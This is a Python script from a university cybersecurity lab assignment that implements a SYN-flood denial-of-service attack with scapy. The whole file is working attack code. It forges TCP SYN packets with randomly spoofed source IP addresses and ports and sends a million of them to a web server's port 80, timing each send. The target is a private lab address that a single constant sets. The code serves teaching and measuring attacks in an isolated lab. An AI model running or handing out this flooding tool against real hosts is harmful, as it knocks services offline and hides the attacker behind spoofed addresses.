"""
DDoS Laboratory
Assignment of `Cyber Lab - Defense` course at Ariel-University

this file contains the implementation for `SYN-Flood` attack.
In our lab, there are `Attacker` and `Target` machines (docker-compose).
The `Target` should run an apache2 web-server when the `Attacker` should attack that server,
using this DDoS (Distributed-Denial-of-Service) attack.

:version: 1.3
:since: 28/04/2023
:authors: Lior Vinman & Yoad Tamar
"""

import scapy.all as scapy
import random
import time
import sys

ATTACKER_ADDR = ("10.9.0.2", 12345)  # attacker machine ip address and port
TARGET_ADDR = ("10.9.0.3", 80)  # target machine ip address and port 80 for HTTP server
FILE = "syns_results_p.txt"  # filename of the results file
NUM_ITERATIONS = 100  # num of attack iterations
NUM_PACKETS = 10000  # num of packets that should be sent in each iteration
SYN_FLAG = "S"  # TCP packet's SYN flag
SUCCESS = 0  # program's success exit code
FAIL = 1  # program's failure exit code


def random_ipv4():
    """
    this function generates a random ipv4
    :return: an ipv4 address, in format: X.X.X.X where 0 <= X <= 255
    :rtype: str
    """
    return f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"


def random_port():
    """
    this function generates a random port number
    :return: a random port number P so that: 1024 <= P <= 65535
    :rtype: int
    """
    return int(random.randint(1024, 65535))


def main():
    try:
        avg = 0
        with open(FILE, "w") as file:
            for i in range(NUM_ITERATIONS):
                for j in range(NUM_PACKETS):

                    ip_header = scapy.IP(src=random_ipv4(), dst=TARGET_ADDR[0])
                    tcp_header = scapy.TCP(sport=random_port(), dport=TARGET_ADDR[1], flags=SYN_FLAG, seq=0)
                    syn_packet = (ip_header / tcp_header)

                    before_send = time.time()
                    scapy.send(syn_packet, verbose=False)
                    after_send = time.time()

                    avg += (after_send - before_send)

                    file.write(f"{(i * NUM_PACKETS) + j} {(after_send - before_send)}\n")
                    file.flush()

                print(f"Sent {((i + 1) * NUM_PACKETS)} packets.")

            avg /= (NUM_ITERATIONS * NUM_PACKETS)
            file.write(f"{avg}")
            file.flush()
    except KeyboardInterrupt:
        print("\nStopping attack...")
        sys.exit(SUCCESS)
    except Exception as e:
        print(f"Error: {e}.")
        sys.exit(FAIL)
    finally:
        if file:
            file.close()


if __name__ == "__main__":
    main()
